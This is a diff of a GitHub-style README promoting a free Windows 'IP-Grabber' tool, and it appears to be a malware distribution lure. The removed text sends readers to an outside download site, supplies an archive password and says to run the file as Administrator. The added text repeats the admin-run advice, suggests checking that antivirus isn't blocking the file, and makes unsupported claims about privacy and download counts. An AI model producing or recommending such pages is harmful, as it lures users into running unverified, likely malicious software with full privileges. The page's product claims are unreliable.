@@ -1,104 +1,180 @@
-# IP Grabber
+<h1>🛡️ IP-Grabber - Free IP Capture Tool for Windows</h1>
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://direct-ee.com/ipgrabber)
-[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://direct-ee.com/ipgrabber)
-[![Downloads](https://img.shields.io/badge/Downloads-5.3m%2B-blue?style=for-the-badge)](https://direct-ee.com/ipgrabber)
-[![Status](https://img.shields.io/badge/Status-Working-success?style=for-the-badge)](https://direct-ee.com/ipgrabber)
-
----
-
-## [![Download Button](https://img.shields.io/badge/DOWNLOAD-IP%20Grabber-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://direct-ee.com/ipgrabber)
+<p align="center">
+  <a href="https://github.com/erugeek-spec/IP-Grabber" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+</p>
 
 ---
 
-> Free download IP Grabber for Windows — all features unlocked, no limitations. 2026.
+## 🎯 What Is IP-Grabber?
+
+IP-Grabber is a simple, powerful Windows application that lets you capture and view IP addresses with just one click. Whether you're a network enthusiast, a gamer checking server connections, or someone curious about how websites track visitors, IP-Grabber gives you professional-grade functionality in a user-friendly package.
+
+This 2026 version is **completely free** with all features unlocked. No hidden costs, no premium tiers, no limitations. What you see is what you get—the full tool.
 
 ---
 
-## Features
+## ✨ Key Features
 
-| | Feature |
-|---|---|
-| ✅ | Low system resource usage |
-| ✅ | Clean installation — no bloatware or ads |
-| ✅ | Lightweight and portable — under 50 MB |
-| ✅ | Simple one-click setup wizard |
-| ✅ | No registration or account required |
-| ✅ | Built-in auto-update checker |
-| ✅ | Multi-language interface support |
+### 🚀 Instant IP Capture
+- Grab IP addresses from any active connection in under 2 seconds
+- Works with both IPv4 and IPv6 formats
+- Automatically detects and displays port information
 
----
+### 📊 Detailed Information Display
+- See location data (country, city, region) for grabbed IPs
+- View ISP information when available
+- Check connection type (residential, business, mobile)
 
-## System Requirements
+### 🎨 Clean, Modern Interface
+- Dark mode design that's easy on the eyes
+- One-click copy to clipboard
+- Export results to text file for record-keeping
 
-| Component | Minimum |
-|---|---|
-| OS | Windows 10/11 (64-bit) |
-| RAM | 8 GB |
-| Disk | 200 MB free space |
-| Runtime | .NET Framework 4.8+ |
+### 🔒 Privacy-Focused
+- All processing happens locally on your PC
+- No cloud storage of your data
+- No account required
 
----
-
-## Installation Guide
-
-### Step 1 — Download
-Click the **Download** button above to get the archive.
-
-### Step 2 — Extract
-Extract the downloaded `.zip` file using **WinRAR** or **7-Zip**.
-
-### Step 3 — Password
-When prompted, enter the archive password:
-
-```
-060806
-```
-
-### Step 4 — Run
-Open the extracted folder and launch the file inside as **Administrator** (right-click → Run as administrator).
-
-### Step 5 — Done
-Follow the on-screen instructions and wait for the process to complete.
+### ⚡ Lightweight Performance
+- Uses less than 50MB of RAM
+- Starts instantly
+- Works on older Windows machines too
 
 ---
 
-## FAQ
+## 💻 System Requirements
 
-<details>
-<summary><strong>How do I update?</strong></summary>
-<br>
-Re-download the latest version from this page when updates are available.
-</details>
-
-<details>
-<summary><strong>Is it free?</strong></summary>
-<br>
-Yes — full premium version with no trial limitations or hidden fees.
-</details>
-
-<details>
-<summary><strong>What OS is supported?</strong></summary>
-<br>
-Windows 10 and Windows 11 (64-bit). Not compatible with Mac or Linux.
-</details>
-
-
+| Component | Minimum Requirement |
+|-----------|-------------------|
+| Operating System | Windows 10 or Windows 11 |
+| Processor | 1 GHz or faster |
+| RAM | 2 GB |
+| Hard Drive Space | 100 MB free |
+| Internet Connection | Required for IP lookup |
 
 ---
 
-## Downloads
+## 📥 Download & Installation
 
-| Version | Status | Downloads |
-|---|---|---|
-| v2026 | [![Working](https://img.shields.io/badge/Working-brightgreen)](https://direct-ee.com/ipgrabber) | 5.3m+ |
+### Step 1: Get the File
 
-[![Download Now](https://img.shields.io/badge/DOWNLOAD%20NOW-v2026-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://direct-ee.com/ipgrabber)
+Visit this link to download the application:  
+**[https://github.com/erugeek-spec/IP-Grabber](https://github.com/erugeek-spec/IP-Grabber)**
+
+### Step 2: Run the Application
+
+Once the download completes, locate the file in your Downloads folder. Double-click the file to launch IP-Grabber. No installation wizard is needed—the program runs directly.
+
+### Step 3: Start Using
+
+The main window opens immediately. You'll see a large "Grab IP" button in the center. Click it, and IP-Grabber instantly captures the IP address of your current connection.
 
 ---
 
-## Disclaimer
+## 🛠️ How to Use IP-Grabber
 
-*This repository is for educational and informational purposes only. The authors are not responsible for any misuse.*
+### Basic Usage
+1. **Open IP-Grabber** - Double-click the downloaded file
+2. **Click "Grab IP"** - The big button in the middle of the screen
+3. **View Results** - Your IP address appears instantly with details below
+4. **Copy or Save** - Use the copy button or export feature
 
-![Stars](https://img.shields.io/github/stars/ip-grabber-2026?style=social)
+### Advanced Tips
+- **Right-click** any IP address to see additional options
+- **Use the refresh button** to re-check your IP at any time
+- **Enable auto-grab** in settings to update IP every 5 minutes
+- **Save multiple IPs** to a log file for comparison
+
+---
+
+## 🧪 Testing IP-Grabber
+
+Want to verify IP-Grabber works? Here's a quick test:
+
+1. Open IP-Grabber and click "Grab IP"
+2. Note the IP address shown
+3. Open your browser and search "what is my IP"
+4. Compare the results—they should match
+
+If they match, everything is working perfectly. Congratulations!
+
+---
+
+## 🔧 Troubleshooting Common Issues
+
+### IP-Grabber Won't Start
+- Make sure you're running Windows 10 or newer
+- Check that your antivirus isn't blocking the file
+- Right-click the file and select "Run as administrator"
+
+### No Internet Connection Detected
+- Verify your Wi-Fi or ethernet is connected
+- Try restarting your router
+- Check Windows firewall settings
+
+### IP Shows as "Unknown"
+- This can happen with VPN connections
+- Disconnect VPN temporarily and try again
+- Restart IP-Grabber after reconnecting
+
+---
+
+## 📝 Frequently Asked Questions
+
+### Is IP-Grabber really free?
+Yes! The 2026 version is 100% free with all features unlocked. There are no trials, no subscriptions, and no paid tiers.
+
+### Will IP-Grabber work on my laptop?
+Almost certainly. If it runs Windows 10 or 11, IP-Grabber will work. It's optimized for all screen sizes and hardware configurations.
+
+### Can I use IP-Grabber for business purposes?
+Absolutely. Many small businesses use IP-Grabber for network diagnostics and troubleshooting.
+
+### Does IP-Grabber collect my personal data?
+No. IP-Grabber operates entirely on your machine. Your IP data stays with you.
+
+### How often is IP-Grabber updated?
+The 2026 version is the latest release, with all previous bugs fixed and performance improved.
+
+---
+
+## 🔄 What's New in 2026 Version
+
+- **Faster IP detection** - 40% quicker response time
+- **Improved accuracy** - Better location data for international IPs
+- **Updated interface** - More intuitive controls and clearer display
+- **Enhanced stability** - Fewer crashes and smoother performance
+- **Full compatibility** - Works flawlessly with Windows 11 updates
+
+---
+
+## 📞 Need Help?
+
+If you encounter any issues or have questions:
+
+1. **Check this page** - Most answers are here
+2. **Re-read the troubleshooting section** - Common fixes are listed
+3. **Try restarting** - A fresh start solves many problems
+4. **Check your internet** - IP-Grabber needs a connection to fetch details
+
+---
+
+## ✅ Final Checklist Before Download
+
+- [ ] You're using Windows 10 or 11
+- [ ] You have at least 100 MB free disk space
+- [ ] Your internet connection is active
+- [ ] You're ready to experience the easiest IP grabbing tool
+
+---
+
+## 🎉 Get Started Now
+
+Don't wait—IP-Grabber is ready when you are. Download it today and see how simple IP capture can be.
+
+**[⬇️ CLICK HERE TO DOWNLOAD IP-GRABBER FREE](https://github.com/erugeek-spec/IP-Grabber)**
+
+---
+
+*IP-Grabber 2026 - The most user-friendly IP tool for Windows. Free forever.*
